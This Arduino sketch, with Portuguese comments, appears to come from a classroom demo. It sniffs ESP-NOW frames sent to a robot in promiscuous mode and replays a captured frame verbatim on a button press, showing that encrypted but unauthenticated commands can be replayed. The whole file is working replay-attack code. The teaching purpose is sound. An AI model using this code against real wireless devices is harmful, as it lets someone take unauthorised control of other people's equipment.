// espiao_monitor_xiao_cif.ino - ESPIAO monitor que REPETE VERBATIM (XIAO ESP32-C6).
//
// Versao que funciona CONTRA A CIFRA. Compare com espiao_monitor_xiao.ino (a versao
// antiga): aquela so repete se reconhecer o comando (F/T/E/D de 1 byte), entao contra
// o trafego cifrado ela captura mas NAO consegue repetir ("nenhum movimento capturado").
// Mostre a antiga falhando primeiro; depois esta, que repete os bytes sem entende-los.
//
// Variante sem M5Unified (o XIAO nao e M5): saida pela Serial e por um LED simples.
// A cada frame ESP-NOW capturado no canal o LED pisca e a Serial imprime o que viu;
// o botao BOOT (GPIO9) REPETE (replay) um frame capturado - VERBATIM, mesmo cifrado.
//
// Por que repete verbatim: contra o trafego cifrado (controle_cripto.py) o espiao
// NAO sabe qual comando e cada frame (ve so bytes). Mas reenviar os MESMOS bytes
// faz o robo decifrar e obedecer. Licao: cifrar da confidencialidade, nao
// autenticidade. (Em texto claro tambem funciona: repete os bytes do comando.)
//
// BOTAO BOOT (GPIO9):
//   toque curto  -> replay do frame SELECIONADO (comeca no ultimo capturado);
//   segurar ~0,6s-> anda a selecao para um frame ANTERIOR do historico.
// Como o controle manda o comando ao apertar e o "P" ao soltar, o ultimo capturado
// costuma ser o "parar". Segure BOOT uma vez para pegar o frame anterior (o movimento)
// e toque para repetir. O espiao escolhe sem saber o que e - esse e o ataque.
//
// Requisitos: core esp32 (Espressif). Nenhuma biblioteca extra. FQBN XIAO_ESP32C6.
//   arduino-cli compile --fqbn esp32:esp32:XIAO_ESP32C6 arduino/espiao_monitor_xiao_cif
//   arduino-cli upload  -p <porta> --fqbn esp32:esp32:XIAO_ESP32C6 arduino/espiao_monitor_xiao_cif

#include <WiFi.h>
#include "esp_wifi.h"
#include "esp_now.h"

// ====================== CONFIGURACAO ======================
static const uint8_t CANAL = 1;               // mesmo canal de todas as placas

// MAC do ROBO: o controle cifrado manda em unicast para ele (o filtro do sniffer
// usa este MAC) e o replay vai para ele. Descubra com ferramentas/mostra_mac.py no robo.
static uint8_t ROBO_MAC[6] = { 0x48, 0x27, 0xe2, 0xe3, 0xac, 0x78 };

// XIAO ESP32-C6: LED de usuario no GPIO15 (ativo em nivel BAIXO), BOOT no GPIO9.
#ifndef LED_BUILTIN
#define LED_BUILTIN 15
#endif
#define PINO_LED        LED_BUILTIN
#define LED_ATIVO_BAIXO 1
#define PINO_BOTAO      9
#define BODY_MAX        32
#define HIST_MAX        16                    // frames guardados para escolher no replay
#define MS_SEGURAR      600                   // segurar BOOT por este tempo = muda selecao
// ==========================================================

static const uint8_t BROADCAST[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };

struct Cap {
  uint8_t src[6];
  uint8_t body[BODY_MAX];
  uint8_t len;
};

// ---------- Fila do callback (promiscuo) para o loop() ----------
#define QN 16
static volatile uint8_t q_head = 0, q_tail = 0;
static Cap q[QN];

// ---------- Historico (para escolher o que repetir) ----------
static Cap  hist[HIST_MAX];
static int  hist_n = 0;
static int  sel = 0;                          // frame selecionado para o replay
static long total = 0;

// Descreve um frame: comando se for 1 byte conhecido, senao os bytes em hex.
static const char* descr(const Cap& c) {
  if (c.len == 1) {
    switch (c.body[0]) {
      case 'F': return "FRENTE";
      case 'T': return "TRAS";
      case 'E': return "ESQ";
      case 'D': return "DIR";
      case 'P': return "PARAR";
    }
  }
  static char buf[24];
  int n = c.len < 6 ? c.len : 6;              // mostra ate 6 bytes
  char* p = buf;
  for (int i = 0; i < n; i++) p += sprintf(p, "%02x", c.body[i]);
  if (c.len > n) { *p++ = '.'; *p++ = '.'; *p = 0; }
  return buf;
}

// ---------- LED ----------
static void ledSet(bool on) {
#if LED_ATIVO_BAIXO
  digitalWrite(PINO_LED, on ? LOW : HIGH);
#else
  digitalWrite(PINO_LED, on ? HIGH : LOW);
#endif
}
static void ledPisca(int vezes, int ms) {
  for (int i = 0; i < vezes; i++) { ledSet(true); delay(ms); ledSet(false); delay(ms); }
}

// ---------- Callback do modo promiscuo ----------
static void sniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
  const uint8_t* p = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;
  if (len < 40) return;

  if (p[24] != 0x7F) return;                  // vendor-specific action
  if (p[32] != 0xDD) return;                  // element vendor-specific
  if (p[34] != 0x18 || p[35] != 0xFE || p[36] != 0x34) return;  // OUI Espressif
  if (p[37] != 0x04) return;                  // tipo ESP-NOW

  const uint8_t* da = p + 4;                  // destino (addr1)
  bool para_robo = (memcmp(da, ROBO_MAC, 6) == 0);
  bool bcast     = (memcmp(da, BROADCAST, 6) == 0);
  if (!para_robo && !bcast) return;

  int bodylen = p[33] - 5;
  if (bodylen < 1) return;
  if (39 + bodylen > len) bodylen = len - 39;
  if (bodylen > BODY_MAX) bodylen = BODY_MAX;

  uint8_t next = (q_head + 1) % QN;
  if (next == q_tail) return;
  memcpy(q[q_head].src, p + 10, 6);           // origem (addr2)
  memcpy(q[q_head].body, p + 39, bodylen);
  q[q_head].len = bodylen;
  q_head = next;
}

static void macStr(const uint8_t* m, char* out) {
  sprintf(out, "%02x:%02x:%02x:%02x:%02x:%02x", m[0], m[1], m[2], m[3], m[4], m[5]);
}

// ---------- Acoes ----------
static void enviarReplay() {
  if (hist_n == 0) { Serial.println("replay: nada capturado ainda"); return; }
  const Cap& c = hist[sel];
  esp_err_t r = esp_now_send(ROBO_MAC, c.body, c.len);   // reenvia os MESMOS bytes
  Serial.printf("REPLAY [%d] %s -> %s\n", sel, descr(c), r == ESP_OK ? "ok" : "falhou");
  ledPisca(3, 60);
}

static void moverSelecao() {
  if (hist_n == 0) return;
  sel = (sel - 1 + hist_n) % hist_n;          // anda para um frame ANTERIOR
  Serial.printf("selecionado [%d] %s\n", sel, descr(hist[sel]));
  ledPisca(2, 150);
}

// ---------- Setup ----------
void setup() {
  pinMode(PINO_LED, OUTPUT); ledSet(false);
  pinMode(PINO_BOTAO, INPUT_PULLUP);
  Serial.begin(115200);
  delay(200);

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  esp_wifi_set_channel(CANAL, WIFI_SECOND_CHAN_NONE);

  if (esp_now_init() == ESP_OK) {             // ESP-NOW so para ENVIAR o replay
    esp_now_peer_info_t peer = {};
    memcpy(peer.peer_addr, ROBO_MAC, 6);
    peer.channel = CANAL;
    peer.ifidx   = WIFI_IF_STA;
    peer.encrypt = false;
    esp_now_add_peer(&peer);
  }

  wifi_promiscuous_filter_t filtro = {};
  filtro.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
  esp_wifi_set_promiscuous_filter(&filtro);
  esp_wifi_set_promiscuous_rx_cb(&sniffer);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(CANAL, WIFI_SECOND_CHAN_NONE);

  char mac[18]; macStr(ROBO_MAC, mac);
  Serial.println("========================================");
  Serial.println("ESPIAO monitor (XIAO ESP32-C6)");
  Serial.printf("Canal %d  destino replay %s\n", CANAL, mac);
  Serial.println("BOOT: toque=replay do selecionado; segurar=frame anterior");
  Serial.println("========================================");
  ledPisca(2, 150);
}

// ---------- Loop ----------
static bool botao_ant = false;
static unsigned long t_press = 0;
static bool longo_feito = false;

void loop() {
  // Consome o que o callback capturou.
  while (q_tail != q_head) {
    Cap c = q[q_tail];
    q_tail = (q_tail + 1) % QN;
    total++;
    if (hist_n < HIST_MAX) {
      hist[hist_n++] = c;
    } else {
      for (int i = 1; i < HIST_MAX; i++) hist[i - 1] = hist[i];
      hist[HIST_MAX - 1] = c;
    }
    sel = hist_n - 1;                         // selecao volta para o mais recente
    char mac[18]; macStr(c.src, mac);
    Serial.printf("[%ld] capturou %s de %s\n", total, descr(c), mac);
    ledPisca(1, 40);
  }

  // BOTAO BOOT: toque curto = replay; segurar = muda selecao.
  bool pressionado = (digitalRead(PINO_BOTAO) == LOW);
  if (pressionado && !botao_ant) { t_press = millis(); longo_feito = false; }
  if (pressionado && !longo_feito && (millis() - t_press) > MS_SEGURAR) {
    moverSelecao();                           // segurou: anda a selecao
    longo_feito = true;
  }
  if (!pressionado && botao_ant && !longo_feito) {
    enviarReplay();                           // soltou sem segurar: toque curto
  }
  botao_ant = pressionado;

  delay(10);
}
